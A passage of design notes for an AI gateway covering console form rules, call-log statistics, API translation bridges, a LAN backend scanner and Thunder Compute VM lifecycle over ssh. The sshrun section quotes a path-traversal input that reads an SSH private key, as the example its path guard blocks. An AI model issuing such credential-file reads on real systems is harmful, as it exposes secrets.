`_CONFIRM_JS` outside `<main>` (the morph never touches it), because the editors' ✕/∅
buttons sit INSIDE another form and a nested `<form>` is invalid HTML. The "+ Add …"
selects carry their URL in `data-post` and call `gwPost` (a throw-away submit button —
never a rewritten form `action`, which a back/forward-cache restore would then Save
into). Query values go through `_q` (`quote(safe="")`), never `_esc`: the HTML escape
split `a&b` into `a` plus a stray `amp;b`. `test_ui_post_only.py` walks the handlers
by AST (no GET route may reach a store/jobs write or a mutating callback — no
exceptions: `_autoresolve_ips` keeps its reverse-DNS names in memory, `_ip_dns`, and
only the Users page's *Save resolved names* POST stores them) and crawls the rendered pages (no
link, no `location.href` to an action). Editor forms carry `data-guard`: an edited one
left by anything but its own submit (an action, a nav tab) gets the browser's
unsaved-changes prompt; **Update workflow** applies the whole editor form before it
swaps the JSON (`_apply_update_form`, shared with Save), and the request-field
drag-reorder SAVES the form — `update` builds the mapping in row order, so the DOM order
is the stored order. A refused create/save answers **400 with the form re-rendered as
typed** plus the reason (`_backends_view`/`_users_view`/`_mapping_view` take a `detail`
override; `_form_err`), never a bare page with "← Back" to an empty form: names that
exist (store OR config) are refused instead of merged/overwritten, a media-alias rename
onto a taken name saves the rest and says so (`&taken=`), and numbers go through
`_int_field`/`_float_field` — blank is the ONLY "unset", "1.5"/"-1"/"1e3" is an error
(a decimal comma is accepted for money). Voice ship targets are checked on Save with
main's own `parse_voice_target`/`_voice_dir_ok` (bound in). `test_ui_form_validation.py`.

### Media statistics — the job store, not the call log

A ComfyUI/cloud generation is a
JOB, not a forwarded call, so it never reaches `stats.calls` and every table in the
Statistic tab was blind to it (it looked unmeasured; it never was). `jobs.gen_stats_rows()`
aggregates done/failed/avg per alias+backend and `admin._media_gen_panel()` renders it
as **Media generation** — including the `routing` column, which is the live
`gen_speed` EMA the scheduler actually orders on (`main.gen_speed_info()`, bound into
admin), so "why did it pick THAT backend?" is answerable in the console instead of
from the source. `avg` counts DONE jobs only: averaging a three-second failure into a
two-minute render would make a broken backend look like the fastest one. The panel
shows even with `stats.enabled` off — its data does not come from stats. The job
LISTS carry the same estimate per row (`_job_dur_cell` → `_expected_dur_s`, the same
`jobs.median_duration` basis as the job view's ETA, memoised 60 s): a running row
reads `12.0 s / ~1.7 min`, so "stuck or just slow?" needs no click. The estimate is a
SIBLING of `.jdur` — `_JOB_TICK` overwrites that element's text every second.

### `stats.py`

Optional SQLite (WAL) call log + body store. The dashboard is
**in the `/ui` Statistic and Input & Routing tabs** (no separate port — the old standalone
:4001 server was folded into the console and its code removed; `stats.py` is data only,
admin renders). Zero new dependencies — keep it.
Bodies are files, never DB columns: `calls/<id>.json.gz` (gzip; `get_body` still reads
the plain `<id>.json` of older blobs), each side capped at `body_max_kb` (default 256 —
beyond it head + tail are kept, marked `_truncated`), deleted after
`body_retention_days` (default 14) by `prune_once` while the ROW stays — row retention
(`retention_days`, default 0 = forever) is separate because the aggregates and the
monthly cost quota read the rows. A refused call keeps its reason, not its request
(`store_request=False`): one agent retrying a refused 1 MB request stored it per retry.
Its preview is built from `main._ends_only(body)` — a stand-in whose JSON has the SAME
first/last 1024 characters at a bounded size — never from the whole body dumped on the
loop per refusal (`test_rejected_log.py`).
The row goes in with `has_body` in ONE autocommitted INSERT on a
`synchronous=NORMAL` connection (WAL: no fsync per call, never inconsistent).
`month_cost` (the monthly cost quota, asked on EVERY request of a capped user) is
answered from memory: `_month_sums` is seeded from the rows at `init()` for the
current UTC month and advanced by `_record_sync`; only an earlier month reads rows.
The `calls` row carries the applied `reasoning` control (shown in LLM Calls) and
the prompt-cache split `cache_read`/`cache_write` — both SUBSETS of
`input_tokens` (which stays the total the model processed), so
`input - read - write` is what was billed fresh. Fed by the adapters'
`_cache_of()` hook (Anthropic: `cache_read_input_tokens` /
`cache_creation_input_tokens`; OpenAI-shaped: `prompt_tokens_details.
cached_tokens`) on all four paths — streamed and not, both protocols.
`cache_trend()` buckets that per backend over 24h and drives the Statistic tab's
sparkline; a hit rate collapsing while input keeps rising is the signal that a
long Claude Code session started paying full price again. New columns are added
by the same `ALTER TABLE` migration list as the earlier ones (an existing prod
stats.db migrates in place; pre-existing rows read 0, never NULL).

### `responses_bridge.py`

Pure Responses↔Chat translation functions (no
gateway state): `responses_to_chat` / `chat_to_responses` / `responses_stream`
(chat SSE → Responses SSE) and `response_shell()`, the ONE Responses-object
skeleton every state (completed / stream events / background queued-failed)
builds on. `main.py` keeps the endpoints, dispatch/parking, and background
mode; the adapter attaches `resp.parsed_json` so the bridge never re-parses
the raw body. Streamed `delta.tool_calls` are collected per slot (the Messages
bridge's index/id rule) and emitted as complete `function_call` items after the
message/reasoning items (`output_item.added` → `function_call_arguments.delta`/
`.done` → `output_item.done`); a stream that dies — an upstream exception, an
in-band `error` payload, or an end with neither `finish_reason` nor `[DONE]` — ends
in `response.failed`, never `completed` around a truncated text. In the request
direction, consecutive `function_call` items (and the assistant text of that turn)
become ONE assistant message — one message per call is a 400 on strict servers.
`test_responses_bridge.py`.

### `anthropic_bridge.py`

Pure Messages↔Chat translation (no gateway state,
no `main`/`adapters` imports): `messages_to_chat` / `chat_to_messages` /
`messages_stream` (chat SSE → Anthropic SSE) / `estimate_input_tokens` and
`message_shell()`. Used ONLY when a non-Anthropic backend serves `/v1/messages`;
an `anthropic` backend forwards verbatim (see `AnthropicAdapter`). Translation
policy: drop what is inert (`cache_control`, history `thinking` blocks,
server-side tools), raise `UnsupportedContent` → 400 where dropping would
silently answer about content the model never saw (documents/PDFs), and MOVE what
chat can carry elsewhere: images inside a `tool_result` (Claude Code's Read on an
image file) go into a user message right after the turn's tool messages, because
the chat `tool` role is text-only. A message carrying tool calls maps to
`stop_reason: tool_use` even when the backend said `stop` (Ollama and some
vLLM/LocalAI builds do) — `end_turn` there ends Claude Code's turn instead of
running the tool. Covered by
`test_anthropic_bridge.py` (stdlib `unittest` — a streaming tool-call bridge fails
silently rather than crashing).

### `openai_image_bridge.py`

Pure request/response plumbing for the OpenAI
image shims (`multipart_list`, `parse_size`, `coerce_scalar`, `images_uploads`
slot mapping, `images_response`); imports only the leaf `jobs`. `main.py`
keeps the endpoints and passes the alias's image `slots` in (one
`_gen_image_slots` lookup per request).

### `reasoning.py`

Pure functions for the normalized thinking toggle, no
`main`/`adapters` imports (hot-reload/test-friendly). Rules are an ordered list
of `{match(model-glob), backends[], adapter, param}`; `resolve()` picks the
first rule whose glob matches AND whose backend-set contains the dispatch
backend, `apply()` rewrites a **copy** of the outgoing chat body per the chosen
`adapter` (`enable_thinking` / `reasoning_effort` / `nothink_token` / `prefill`
/ `none`) and returns the `x-reasoning-control` string. `none`/no-match →
`unsupported` (never fails). Rules live in `store` (settings key
`reasoning_rules`), are cached in `main.reasoning_rules` (refreshed on save via
`apply_reasoning_rules()`), and are edited in the `/ui` **Reasoning** tab.
Additionally a **per-alias default** (`alias_reasoning`, store settings; edited
in the chat-alias editor) supplies off/on when the client sends nothing — so
`tool`/`tool-thinking` can share one backend+model; an explicit client
`reasoning` always wins.

### `previewanim.py`

Injects a short looping idle animation into a rigged GLB for
the `/ui` inspection view ONLY (`add_idle(glb) → glb`), so bad skin weights show as
spikes/rings once it deforms. Pure struct/json on the glTF binary, append-only; the
result route applies it on `?anim=idle`, never to the delivered file.

### `netscan.py`

The LAN scan behind Backends → *Scan network* (spec
`docs/superpowers/specs/2026-09-08-lan-scan-design.md`): pure (no `main`/`adapters`
imports, no module state, `fetch`/`resolve`/runner injected). `parse_ip_addr` derives
the /24 of every own IPv4 address (a shorter prefix is NARROWED, a /30 kept),
`expand_targets` caps at `HOST_CAP` 1024, `scan` TCP-connects (0.5 s, 256 parallel)
then `fingerprint`s every open port — `/v1/models` (openai; 401/403 = needs key) →
`/system_stats` (comfyui) → `/api/tags` (Ollama) — and `known_backend_for` matches
host+port against the configured list so a registered backend is named, not
re-offered. `main.start_scan`/`scan_status` own the ONE task and the settings
`scan_cidrs`/`scan_ports`; `admin._scan_panel` renders it live (`data-sk="scan"`),
*Add* opens `_backend_form(prefill=…)`. Manual only, never writes the store.

### Managed hosts

(spec `docs/superpowers/specs/2026-09-29-managed-hosts-design.md` on
top of `2026-09-27-thunder-comfyui-design.md`, both local only; the rulings R-K*/R-W*
and the ledger's M1–M5 are cited below). The MACHINE is its own level: a *managed
host* (store setting `managed_hosts` = `{name: {provider, options}}`) carries a
**provider** (Thunder Compute today, RunPod later) — whose API token is stored ONCE per
provider (`provider_token_<kind>`, below), not per host — and ANY backend attaches
to it by naming it as its `host` — a VM can carry several services (one ComfyUI plus
vLLM/llama-swap …). Six modules share the work: `thunder.py` (the provider's pure
half), `hostapi.py` (its HTTP half + the registry), `services.py` (what runs a backend
on the VM, by type), `hostctl.py` (one lifecycle controller per host), `sshrun.py`
(argv, tunnel, streams) and `modelsync.py` (which model files a ComfyUI alias needs).
It replaced the per-backend `thunder` block (none was ever stored: no migration; the old
`thunder_state` key is never read).

### `thunder.py`

The PURE half of the **Thunder Compute** provider and the shape of
the PROVIDER INTERFACE a second provider copies (duck-typed modules like
`meshy.py`/`tripo.py`, no ABC): `KIND` (`thunder`, the registry key and the key-file
prefix), `NAME` (shown in the Provider select, the card and the refusal texts),
`SSH_USER` (`ubuntu`), `STOP_MODE` (`snapshot` = stop is snapshot + delete; a RunPod-like
`native` stop that keeps the volume is NOT built — `hostctl._stop_run` is the one
place it would branch), `DEFAULT_TEMPLATE_NO_COMFY` (`base`), and the host form as
DATA: `OPTION_FIELDS` (gpu_type, num_gpus, vcpus, bootstrap_template, reserve_gb,
comfy_commit, nodes — key/label/type/choices/default/hint/min) read by
`options_of(form) → (options, errors, typed)`, which never raises and returns a VALID
value on every key (the field's default where a field is blank, absent or refused —
a stored typo would become the gpu_type, a "0" vcpus a 422 after the start began),
the refusals, and what was typed for re-rendering the form. Blank is the ONE unset;
ints are whole digits ≥ `min` (`1.5`/`-1`/`1e3`/`+2` refused), the commit a full
40-hex sha. `vcpus` defaults to `VCPUS_INCLUDED = ""` shown as "included" (the form may
send the word): the GPU configuration's smallest `vcpuOptions` entry — Thunder bills
every vCPU above it, and the old fixed 8 paid 2 extra on every l40 ($0.87/h instead of
$0.79/h, operator 2026-10-01). `vcpu_options`/`included_vcpus(specs, gpu, n)` read
every `/v2/specs` shape (counts as strings; None/[] when unknown); `resolve_options(
options, specs)` → `(copy, None)` | `(None, why)` resolves the blank at START (unknown
→ "cannot read Thunder's vCPU options for <gpu> ×<n> — set vcpus explicitly or try
again", never a guess) and refuses a typed count the specs know is not offered
("l40 ×1 offers vCPUs 6, 8, 12"); `options_refusal` is the Save's half (unknown specs
cannot judge → None); `effective_vcpus`/`blank_label` feed the card and the form's
placeholder ("included (6 for l40 ×1)"); `create_body` raises on an unresolved blank.
Stored explicit counts stay (no migration). `bootstrap_template` defaults to `AUTO_TEMPLATE = ""` shown as "auto"
(Ruling M5): the controller picks `comfy-ui` when a ComfyUI service is attached at
the first start, else `base` — a fixed `comfy-ui` default gave every vLLM-only host
the template's ComfyUI and its bundled models. The rest is the API model: Thunder has
NO stop — "off" is snapshot → delete, "on" a new instance whose `template` is the
snapshot's name — and IP, ssh port and host key change per instance.
`create_body` int()s the RESOLVED options ("8" would be a 422); `parse_instances`
takes the map OR the list shape, every field optional, counts arriving as STRINGS, and
an unknown status reads as "not finished yet" (the values are undocumented — the
controller bounds the wait). `choose_disk_gb` = models + base install + reserve, never
below the snapshot's `minimumDiskSizeGb` (Thunder refuses the restore), the spec
minimum or 100 GB per GPU, rounded up to 10, `DiskTooSmall` above the spec maximum —
disks only GROW, so this is also what every later snapshot carries. `hourly_cost` = the
GPU config's rate + vCPUs above the spec's SMALLEST option × `additional_vcpus` + disk
BEYOND the included 100 GB per GPU (the plan's full-size billing was a defect), None
without a price — a made-up number is worse than none. Snapshots are named
`aihub-<slug(host name)>-<YYYYmmdd>t<HHMMSS>z` (fully lowercase: `[a-z0-9-]` is the one
rule Thunder could enforce) and `_owned` needs that exact stamp shape, so a hand-made
`aihub-x-final` is never ours; ownership, `newest_ready` and `rotation` run on the
HOST name (R-W4) — `rotation` deletes only OLDER snapshots of this host (by
`createdAt`, not the name) and only once a NEWER READY one exists — the last READY one
never, FAILED ones always; `foreign_snapshots` lists `aihub-` snapshots no host owns
with $/month (display only — a deleted host leaves its snapshots behind, and a
snapshot named after a pre-split BACKEND is foreign too). `test_thunder.py`.

### `hostapi.py`

The HTTP half of a provider and the registry.
`PROVIDERS = {"thunder": (thunder, ThunderApi)}` + `provider(kind)` (→ tuple or None,
a non-string is None) is the ONE place the console (the Provider select, the option
form) and the controller look a provider up — a second list would let the form offer
a provider the controller cannot drive. `ProviderApi` holds every rule a REST client
of a billing API gets wrong silently: `httpx.Timeout(30, connect=10)`; ANY 2xx is
success (Thunder's create answers 201, its snapshot create 202 — `== 200` calls a
paid create a failure); a transport failure is an `Error` NAMED by its type (`str()`
of an httpx error can be empty); every error text passes `_redact` (an API that echoes
the request, Authorization included, must not put the token into the panel or fault
log) and is clipped; `_by_id` tries the UUID first and the index only on a 404
(Ruling 11: the docs contradict each other, and a reused index can name a stranger's
machine — a 400/422 for the wrong form does NOT fall back); `_cached` fetches a price
list once per hour and `cached()` hands a synchronous view the last body. A provider
is its class attributes: `API`, `ITEM_PATH` (`/instances/{id}/{suffix}`; the base has
none and `_by_id` refuses without one) and `Error` (`thunder.ThunderError`).
`test_hostapi.py`.

### `services.py`

The service PROFILES (pure: imports only `sshrun`, returns remote
command strings and stdin bytes, `hostctl` runs them), picked by backend TYPE
(`profile_for`: `comfyui` → `COMFY`, `openai` → `COMMAND`, anything else None = cannot
run on a managed host). ComfyUI: set up by the ComfyUI bootstrap (no per-service
script), run by the `~/start-comfy.sh <port>` loop it writes — the loop takes the
service's REMOTE port (M4 d), so a ComfyUI on another port than 8188 is started,
probed (`/object_info` = 200) and restarted there; default port 8188. Command (vLLM,
llama-swap, any OpenAI-compatible server): the backend's `svc_setup` (optional, run
once per sha256 — `setup_hash`, CRLF→LF first: a browser textarea's `\r` is a
different command), `svc_start` (required) and `svc_health` (default `/v1/models`,
regex `^/[A-Za-z0-9._~/?=&-]*$`; 200, 401 or 403 = up — R-W9: a server with its own
API key answers 401 and IS up); default port 8000. The gateway writes
`~/gw-svc-<slug>.sh` (flock'd `~/gw-svc-<slug>.lock` holding the loop's pid, a
`while :` loop running `bash -c "$GW_START"`, fd 9 closed for every child, log
`~/gw-svc-<slug>.log`, and its OWN `HF_HOME=~/hf-cache-<slug>` — R-W2: `~/hf-cache`
belongs to the model sync, whose unknown/prune lists would otherwise hold LLM weights)
and starts it with `setsid nohup`; the setup runs as `bash -s` tee'd to
`~/gw-svc-<slug>.setup.log` (like the bootstraps: after a timeout the log end is
still readable). **The admin's text is never in a command** (visible to every
process on the VM via `ps`, and logged): the setup script goes on stdin, the start
command as a quoted heredoc INSIDE the wrapper — whose delimiter is derived so no line
of the text equals it — which is itself streamed into `cat >` and renamed into place
(the running loop keeps its inode). Stop is by the LOCK: `setsid` made the loop a
process-group leader, so `kill -- -<pid>` ends the loop and every child (TERM, ≤ 20 s,
KILL), and only a HELD lock is trusted — a pid in a lock nobody holds belongs to a
process long gone, or to a stranger by now; restart = stop + fresh loop, so a
rewritten wrapper (changed `svc_start`) actually runs. `slug(name)` = `[a-z0-9-]`, ≤ 48
chars, unique per host (R-W8). `validate` refuses with FIXED texts only (the admin's
text never echoes into an error). **Exposure check** (Ruling M6): `LISTEN_CMD`
(`ss -ltnH`) + `exposed_listeners(out, port)` (loopback = `127/8`, `::1`, v4-mapped
loopback; `0.0.0.0`/`*`/`::`/any other address is exposed) + `exposure_warning`; the
controller marks a command service due when its status turns `up` (and on resume's
probe) and the next tick's `_check_exposures` sets the service's `warning` — a
`--host 0.0.0.0` vLLM is unauthenticated and reachable from outside the VM, yet looks
exactly like a loopback bind through the tunnel; shown on the card's row, never killed.
`test_services.py` (pure + a real `bash -c` run of the wrapper against a temp HOME).

### `sshrun.py`

System-`ssh` plumbing (no asyncssh/paramiko: no new dependency, and
OpenSSH already gives forwards that die loudly on `ExitOnForwardFailure`, keepalives,
a known_hosts file per instance and ControlMaster multiplexing). Pure argv builders:
`ssh_base` (`-F /dev/null` — no user/system ssh_config can add a LocalForward,
ProxyCommand or identity to the privileged tunnel; `control_argv` passes it too —
BatchMode — a prompt would hang a subprocess nobody answers —
IdentitiesOnly, the caller's known_hosts, keepalives, ConnectTimeout), `tunnel_argv(key,
kh, host, port, forwards, ctl_path)` — ONE ControlMaster per host (`-N -M -S <ctl>
-o ControlPersist=no -o ExitOnForwardFailure=yes`, one `-L 127.0.0.1:<l>:127.0.0.1:<r>`
per service, loopback on BOTH ends; exact duplicates dropped, one local port to two
remote ports refused — it would take every forward down at once; empty = a bare
master) — and `control_argv` (`-S <ctl> -O forward|cancel -L …`; `exit`/`stop` refused,
they would end every service's tunnel), run by async `control()` → `(rc, reason)`. That
is R-W1: a forward added or removed while the host runs never restarts the tunnel under
another service's stream. `check_ctl_path` (absolute, no `%`/`$`/`~` — ssh expands all
three in `-S`, so the path is passed ONLY via `-S`, never as `ControlPath=` — no
control characters, ≤ `CTL_PATH_MAX` = 86 BYTES: sun_path 104/108 minus the 17-byte
temp name the master binds first); `prepare_ctl_path` (called only right before a
master spawns: parent dir 0700, a STALE socket — connect refused — removed, since a
master finding one runs WITHOUT a control socket and every later `-O forward` fails;
a socket something listens on, or any non-socket, is left in place with a
`ValueError`, and an unjudgeable probe is a named `ValueError` too, M3). Every argv
ends `-- <host> [cmd]` (a host starting with `-` is otherwise an OPTION), remote words
are the caller's to `q()` (= `shlex.quote`), and nothing secret is ever in argv
(world-readable in /proc) — the key is a FILE. `safe_rel` is the remote path guard
(absolute, `..`, dot segments such as `hf-cache/.token`, control characters,
backslashes): quoting stops the shell, not `cat ../../.ssh/id_ed25519`. `run` is
one-shot with stdin through a PIPE and answers a timeout with `(124, b"", b"timeout")`
— everything read so far is lost, which is why every script tees its own log on the
box. `pipe` (the LAN stream) copies one process's stdout into another's stdin in 1 MiB
chunks and ends BOTH on an idle timeout, a destination that died, and cancellation —
a source writing into a pipe nobody reads hangs forever. `Supervisor` keeps the tunnel
up with a doubling backoff (reset after a stable minute), logs the stderr tail of
every exit (a changed host key and a refused port look identical otherwise), keeps
`last_spawn_error` (cleared by a good spawn — M3: a tunnel that can never start must
not read like a restart), and on `stop()` ends AND reaps its ssh: an orphan `ssh -N`
keeps the local port bound and the next tunnel exits at once. `running` means "an ssh
is alive right now", never "supervision active" and never "port free". Processes end
by pid (`_signal`), never `proc.kill()`. `test_sshrun.py`.

### `hostctl.py`

One `Controller(host, services, deps)` per MANAGED HOST (formerly
`thunderctl.py`): the lifecycle, the tunnel, the
services, the model sync. Never imports `main` — everything arrives in `Deps` (store
I/O, `set_enabled`, `begin_drain`/`cancel_drain`/`hold_routing`/`inflight`/
`is_draining`, the fault log, the probes
`probe_comfy`/`probe_http`, both bootstrap scripts, ssh `run`/`control`/`pipe`/`spawn`,
the model-sync callables taking a SERVICE bid). The provider module and API class come
from `hostapi.provider(host["provider"])` (unknown → `ValueError`); every provider
call goes through `self._prov`/`self._Error`, so a second provider is data, not a fork.
**Host vs service** (R-K1): the machine's — phase, instance ids, snapshots (by host
name, R-W4), `<kind>.key` + `<kind>-known_hosts/<uuid>`, the control socket, the
bootstrap flags, and the faults of creating/snapshotting/deleting it, booked on the
pseudo backend `{"name": <host>, "type": "managed-host"}` (the fault log groups by
backend+type) — vs one service's: its backend's `enabled`, its drain, its forward, its
status in `State.services` (`{bid: {status starting|up|setup failed|down, error,
setup_hash}}`), and the faults of setting it up, starting it or syncing its models,
booked on its backend (name/type/host/url only — the dict holds admin text).
`set_services(list)` hands over the attached backends (main, per rebuild);
`_problems()` marks those that cannot run — no profile, bad ports, `validate`, a second
ComfyUI, a duplicate local or remote port, a command slug collision — `down` with the
cause: no forward, never enabled (enabling a duplicate-port backend would route to
ANOTHER service), never started, and attached like a new one once fixed.
**Tunnel** (R-W1): the Supervisor's argv carries every current forward; a change while
it runs goes through `reconcile_forwards()` → `deps.control(forward|cancel)` (serialised
by `_fwd_lock`), never a respawn; a master that died is respawned with all of them. A
forward the master refuses (port busy) marks only THAT service `down` with ssh's
reason, is kept OUT of a respawned master's argv (ExitOnForwardFailure would take the
whole tunnel down) and retried with a doubling backoff (5 s → 300 s); success resets it
to `starting` and the tick brings it up (M4 b). The control socket is
`<datadir>/<kind>-ctl/<slug>-<sha8>` (the hash keeps names that slug alike apart — a
shared path would let one controller delete the other's LIVE socket); when that
exceeds 86 bytes, `/tmp/ai-hub-<uid>-ctl/<kind>-<slug>-<sha8>` (Ruling M2; must be a
real dir owned by this uid — the unit's `PrivateTmp` makes /tmp private), else the
card shows `tunnel_error`. The state is persisted on EVERY phase change (store setting
`host_state`, one entry per HOST name): an instance bills whether or not the gateway
remembers it; a failed save is kept in `persist_error` (card + `view()`), and one right
before the create POST ends the start in `off` instead of creating an instance no
restart could find. An unreadable record makes the controller `failed(load)` with
saving SUPPRESSED and start refused (it may name a billing instance); the log ring and
the transfer table are not persisted (a stale "40 %" after a restart would lie). The
rules everything else rests on:
**Identity** (Ruling 10): Thunder REUSES instance indices, so a mutating call only
ever uses an item found BY UUID in a FRESH `/instances/list` of the same operation
(`_find_ours`); a stored index alone counts only when that fresh list confirms the
uuid there or — uuid unknown — that we created it (template + `createdAt` window).
Deleting a stranger's instance is irreversible; an orphan of ours at worst shows as a
warning. The uuid is persisted BEFORE the first wait of a create.
**Never `off` without confirmed gone**: an instance counts as gone only after
`_ABSENT_CONFIRM` (2) consecutive fresh lists without it — `parse_instances` reads
any odd 2xx body as `[]`, and one bad answer must not make the controller forget (and
stop deleting) what bills; one that stays is `failed(deleting)`, and only a
confirmed-gone instance clears the ids and `started_at` (the session cost stops there).
**Start** (`start()`): refused before any call — it raises the FIRST item of
`start_blockers()`, the pure list (memory only, no provider call) the card disables its
Start button from, so the two cannot disagree: the state not loaded, an op in flight,
a phase that is not startable, no service, none that can run (the per-service causes),
a bad commit (only with a ComfyUI service), no token (`no <NAME> API token set — enter
it under Server → API Keys`); the unreconciled uuids are NOT in it (they
are judged by a fresh list inside the op). `checklist()` →
`[{ok, text, required[, key]}]` (the token — `key: "token"`, which the card links to
Server → API Keys —, a runnable attached backend, and — with a ComfyUI service — the
optional LAN source) is NOT part of `view()`: the LAN check reads the store and `view()` runs every
few seconds for the Dashboard; main's `host_view` adds both → enable EVERY runnable service (`_enable`; one failing =
`_PreCreate`, the ones already enabled are disabled again) → newest READY snapshot of
this host, else the template (`bootstrap_template`, "" = auto, M5) → `/v2/specs` and
`resolve_options` (a blank vcpus = included; a failing fresh fetch falls back to the
provider's last CACHED list — its own list, not a guess; no cache, or a count not
offered = `_PreCreate`, `off`, no create; a typed count with no specs at all still fails
the start as before, and the "(an instance may exist anyway …)" note is added only once
the create was POSTed — `_create_posted`; `State.vcpus` records the created count, `vcpus_view()` = it while
the instance runs, else what a start would use — `view()["vcpus"]` and `cost_per_h`
read it, the card says "vCPUs included" when it is None) → `choose_disk_gb`
(from the manifest copy stored for THAT snapshot id) → create → poll (15 min + 8 min
per 100 GB) → the port guard `_ensure_ports_closed` (`httpPorts` non-empty → removed
and re-checked; `bootstrapping`/`starting` are never entered with one open, and an
attach to a running host runs it too: Thunder's forwarding has no auth) → a fresh
known_hosts per uuid → tunnel → the bootstrap split (R-W3): the HOST bootstrap
(`ops/host-bootstrap.sh`, every host, first start or a snapshot taken before it
finished; `~/gw-host-bootstrap.log`, 30 min) and — only with a ComfyUI service — the
ComfyUI bootstrap (`ops/thunder-bootstrap.sh`, `~/gw-bootstrap.log`; the node list
`~/.gw-nodes.txt` is uploaded BEFORE the host bootstrap so its template-pack report
skips our own packs; an empty list uploads `ops/thunder-nodes.default.txt`), both
judged by their `GW:` lines BY TAG (`parse_bootstrap`/`bootstrap_verdict`: any
`GW:NODE_FAIL` fails even after `GW:DONE`, Ruling 9; while either — or a command
service's setup — runs, `_run_script(which=…)` starts a display-only side task that
every `_BOOTSTRAP_POLL_S` (15 s) reads the log's end with the FIXED `bootstrap_poll_cmd`
— a grep count of `node … @` lines, the WHOLE log's last `GW:PHASE` (a verbose phase
scrolls its marker out of the window) and `tail -n 40` of the one constant path, 20 s
timeout, failures ignored; the phase never moves back to unknown, and a poll is applied
only to the run it was started for — into `view()["bootstrap_running"]` (phase, last line, step
of `HOST_BOOTSTRAP_PHASES`/`COMFY_BOOTSTRAP_PHASES` — pinned against the scripts'
`phase` calls —, node i/N, fraction; memory only, a new phase logged once), cancelled
and cleared in a `finally`; the card shows it instead of the red `bootstrap_incomplete`
note, which appears only with nothing running and no start on its way to the
bootstrap (in `bootstrapping` only until the ComfyUI service is `setup failed`) — 2026-10-01, a normal 20-min first bootstrap read as "stuck") → per service: setup if its hash
differs, start, probe (command 20 min, ComfyUI 10 min) → sync → `ready`. The host is
`ready` once the VM runs and the tunnel stands; a service's setup or start failing is
THAT service's `setup failed`/`down` + a fault on its backend, the instance kept and
the other services running (M4 g) — the host fails only on what is the machine's
(provider, ssh, port guard, host bootstrap). Each script keeps its own done-flag that a
snapshot inherits (`host_bootstrapped` / `host_incomplete_snapshots`,
`bootstrap_incomplete` / `incomplete_snapshots` — ComfyUI only — and
`no_comfy_snapshots` for a disk that never had ComfyUI, so attaching one later
bootstraps it without calling the snapshot broken); `_ready()` counts an unfinished
host bootstrap as done (finished by hand) and clears the ComfyUI flag only when ComfyUI
is `up`; the host bootstrap's `GW:UNKNOWN_MODEL` report drops every path a manifest
knows (our synced models are never "unknown"). The command setup hash is tied to the
DISK: recorded per snapshot (`setup_snapshots`), restored from the snapshot at create,
"" on a template — a hash from another disk would skip a setup that disk needs. Before
the create a failure is `off`, after it `failed(<phase>)` with the instance KEPT for
diagnosis. A start is refused while `unreconciled_uuids` (instances seen next to an
unreadable record) are still listed — gone only after `_ABSENT_CONFIRM` lists without
them, checked INSIDE the start op, so a stop during the check aborts it — *Forget
unreconciled* is the operator's reset.
**Attach/detach while running** (`_reconcile_services`, the 5-s tick): `_attached`
(bid → signature: type, remote port, problem, setup hash, wrapper hash; local port and
health path apart — they only re-probe) is diffed against the current list and ONE op
"updating services" runs (abortable by a stop): new → enable, forward, port guard,
setup if needed, start, probe; changed → setup if needed + restart, but only once idle
(`_restart_when_idle`: `deps.hold_routing(bid, True)` — main's `_hold_routing` puts it
in `_draining` WITHOUT the finalize that would disable it — then waits for
`inflight == 0` up to `_RESTART_WAIT_MAX_S` (600 s) as status `restart pending`, and
gives routing back in a `finally`, a stop's abort included; a restart on every config
save killed what the service was answering; the Restart button stays immediate);
local-port/health-path-only → probe; detached → the
profile's `stop_cmd` (+ transfers ended for ComfyUI), forward cancelled, and NEVER
`set_enabled(False)` (R-K2: `enabled` belongs to the host the backend is on NOW — a
backend moved H1 → H2 or to a real URL is not H1's to switch off). A ComfyUI attached
to a running host is bootstrapped inside that op (`_ensure_comfy_bootstrap` refuses
outside an op or during a stop). Buttons: `restart_service(bid)` (ComfyUI →
`restart_comfy`, stop the loop's group + start fresh on its port; command → stop +
start, host phase untouched) and `resetup(bid)` (forced setup — ComfyUI: the bootstrap
— then restart; the host stays `ready`); both op-guarded.
**Stop aborts start** (Ruling 13): `stop()` cancels a start/restart in flight and stops
from the phase it reached — before any bootstrap (`creating|restoring|connecting`) the
instance holds nothing worth a snapshot and is deleted straight away. Otherwise
draining (`begin_drain` for EVERY service, then all `inflight == 0` and none still
draining; one that cannot drain is `failed(draining)`, instance kept; `waiting_jobs`
per bid on the card) → every transfer cancelled AND awaited (`_cancel_sync_tasks`;
else the snapshot freezes growing `.part`s, or an in-flight sync replaces the
manifest) → pruning (a host without ComfyUI: only unfinished downloads — no plan, whose
prune list would be every synced file) → snapshotting (the name is persisted BEFORE the
POST and looked up before creating, so a restart never takes two; a FAILED snapshot of
that name is never adopted — a new one is taken) → deleting → `off`, which disables
the services attached AT THAT MOMENT. A service list handed over during a stop (Ruling
M4 a) is kept in `_pending_services` — the drain's list stands, nothing attaches into a
stopping host — and applied at `off` BEFORE the disable (so a backend moved away
meanwhile is left alone). A list that differs only in `enabled` (`_same_services`: per backend id, in any
order — a `priority` edit only re-sorts — ignoring `enabled` and `_`-keys) is NO change: it is the stop's own drain finalize coming
back through main's rebuild — its fresh dicts are kept, nothing goes pending, nothing is
logged; once the phase is `off` a list applies at once even while the op is still
"stopping"; and `off`'s `_disable()` skips a service whose CURRENT dict says `enabled is False` —
only then: absent, None or any other value is disabled again, since a backend left
enabled after `off` routes to a dead tunnel (the drain did it — thunder-1's first stop disabled it twice and logged "services
changed" four times; an explicit list, a failed start undoing its enable, is always
disabled). A pending list that ends up equal again by `off` logs "services unchanged
after all", closing its "while stopping" line. A backend that list no longer names also LEAVES the drain at
the next poll (`_leave_moved`: `deps.cancel_drain`, no longer waited on) — left in it,
routing skipped it on its new host — and main's `_finalize_drain` disables only a
backend still on the host it named when its drain began (`_drain_host`), so a last H1
request ending after H2 enabled it cannot switch it off (R-K2). `watch_snapshots()` settles the pending snapshot: READY →
`rotation`; FAILED → fault `lifecycle`/`snapshot_failed` and the previous READY one
stays the template. `resume()` after a gateway restart reconciles with the list (an
interrupted stop runs on; a live instance gets its tunnel back with every forward,
each service probed on its OWN forward and only a non-answering one restarted — a
command service whose setup changed meanwhile gets setup + restart; an interrupted
setup is `setup failed` naming its log, never run twice; a vanished instance is `off`
+ `instance_vanished`); foreign instances are shown with $/h and NEVER adopted or
deleted. `refresh_account()` re-reads snapshots and foreign instances every 10 min
(`_ACCOUNT_S`) and the price list hourly, and books `lifecycle`/`instance_vanished`
(phase untouched — that is the stop path's call) when our uuid is missing from two
